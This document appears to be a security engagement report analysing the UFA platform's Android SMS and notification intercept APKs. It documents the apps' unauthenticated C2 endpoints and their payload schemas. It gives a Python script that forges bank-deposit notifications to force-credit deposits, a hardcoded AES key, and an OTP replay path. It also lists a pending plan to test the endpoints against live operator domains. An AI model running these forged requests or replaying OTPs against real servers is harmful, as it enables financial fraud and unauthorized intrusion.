# UFA Platform — SMS Intercept APK Analysis
**Engagement:** WE88Z-VAK88-2026-09  
**Date:** 2026-09-19  
**Source:** `ProjectAndroid.zip` (confirmed old UFA APK suite)

---

## Platform Overview

UFA is the first platform analyzed in this engagement. The `ProjectAndroid.zip` file contains the full Java source code for UFA's operator-side Android intercept toolkit — 5 separate APK projects covering all bank notification/SMS capture methods.

---

## APK Suite (ProjectAndroid.zip)

All apps share the same architecture:
- **HTTP library:** OkHttp3 (plain form-encoded POST)
- **Auth:** None — no HMAC, no token, no signature
- **Config:** `SharedPreferences` (`Domain` + `BankNumber` fields set by operator via UI)
- **URL pattern:** `https://{Domain}/{endpoint}`

| APK Project | Package | Trigger | Banks Supported | C2 Endpoint |
|-------------|---------|---------|-----------------|-------------|
| BankNoticeCapture | `com.example.banknoticecapture` | LINE app push notifications (`jp.naver.line.android`) | SCB Connect, GSB NOW | `/api/CheckNoticeBank?BankType={SCB\|GSB}` |
| BankAppCapture | `com.example.bankappcapture` | Native bank app notifications | KTB (`ktbcs.netbank`), TTB (`com.TMBTOUCH.PRODUCTION`) | `/api/CheckNoticeBank?BankType={KTB\|TTB}` |
| BankSMS_Intercepter | `com.example.otp` | SMS broadcast receiver | All banks (SMS) | `/api/CheckAmtBankVX` (AES-256-CBC encrypted) |
| BankWithdrawOTP | `com.example.otp` | SMS broadcast receiver (OTP only) | Krungsri/BAY, GSB | `/api/WithdrawOTP.php?BankType={BAY\|GSB}` |
| KaichonNoticeCapture | `com.example.kaichonnoticecapture` | LINE app push notifications | Any (raw forward) | `/cmd/Sync` |

---

## Payload Schemas

### CheckNoticeBank (BankNoticeCapture / BankAppCapture)

```http
POST https://{operator_domain}/api/CheckNoticeBank?BankType=KTB
Content-Type: application/x-www-form-urlencoded

Body=<notification_text>&BankNumber=<operator_bank_account>
```

**No auth. No HMAC.** Any IP can POST any body — critical unauthenticated injection point.

Example forged body (KTB):
```
Body=รับเงินสำเร็จ 10,000.00 บาท จาก นาย ATTACKER&BankNumber=0123456789
```

### CheckAmtBankVX (BankSMS_Intercepter)

AES-256-CBC encrypted (same as Platform B/7sean). Key: `omg357159wtf`

```
POST /api/CheckAmtBankVX
Content-Type: application/x-www-form-urlencoded

Param=<AES-CBC-base64>
```

Plaintext before encryption: `BankType={bank}&Key=omg357159wtf&Body={sms}&Token={bank_acct}`

Forge script: `/tmp/...scratchpad/forge_banksms_vx.py`

### WithdrawOTP (BankWithdrawOTP)

```http
POST https://{operator_domain}/api/WithdrawOTP.php?BankType=BAY
Content-Type: application/x-www-form-urlencoded

Body=<full_OTP_SMS_text>&BankNumber=<operator_bank_account>
```

Intercepts bank OTP SMS for Krungsri/BAY and GSB withdrawals. If operator exposes this endpoint, attacker can replay captured OTPs.

### Sync (KaichonNoticeCapture)

```http
POST https://{operator_domain}/cmd/Sync
Content-Type: application/x-www-form-urlencoded

Body=<LINE_notification_text>
```

No BankNumber field. Different backend — Kaichon-specific C2 server.

---

## Exploitation Paths

### Path 1: Unauthenticated Deposit Injection (CheckNoticeBank)

**Impact:** Force-credit any amount to any pending deposit order.

**Requirements:**
1. Know the operator's server domain (not always public)
2. Know the operator's bank account number (`BankNumber` field)
3. Know the approximate amount of a pending user deposit order

```python
import requests

domain = "ufa-operator.example.com"  # operator's C2 domain
bank_number = "0123456789"           # operator's bank account

for bank_type in ["KTB", "SCB", "TTB", "GSB"]:
    r = requests.post(
        f"https://{domain}/api/CheckNoticeBank?BankType={bank_type}",
        data={"Body": f"รับโอนเงิน 1000.00 บาท จาก นาย TEST", "BankNumber": bank_number},
        verify=False, timeout=5
    )
    print(f"{bank_type}: {r.status_code} {r.text[:100]}")
```

### Path 2: OTP Replay via WithdrawOTP

If `/api/WithdrawOTP.php` is exposed and attacker intercepts (or social-engineers) an OTP SMS:
1. Forward the full OTP SMS body to the endpoint
2. Operator's backend uses the OTP to approve a bank withdrawal
3. Funds leave the operator's bank account

### Path 3: KaichonNoticeCapture Server Discovery

Identify servers running `/cmd/Sync`. These are a separate Kaichon platform C2 — raw LINE notification forwarding with no auth.

---

## Key Findings

| Item | Value |
|------|-------|
| BankSMS key | `omg357159wtf` (shared with Platform B / 7sean) |
| Intercept endpoint | `https://{Domain}/api/CheckNoticeBank` |
| OTP endpoint | `https://{Domain}/api/WithdrawOTP.php` |
| LINE sync endpoint | `https://{Domain}/cmd/Sync` |
| No auth on any intercept endpoint | Confirmed |

**Note:** The fact that `BankSMS_Intercepter` uses the same key (`omg357159wtf`) as Platform B/7sean (`BankSMS_IntercepterVX.apk`) confirms that 7sean's platform **forked from or shares code with UFA's intercepter suite**.

---

## Pending

- Identify live UFA operator domains running these C2 endpoints
- Test CheckNoticeBank endpoint against any discovered domains
- Determine if UFA's main API (ufa345.com) has been updated — prior sessions obtained source but no live C2 URL confirmed
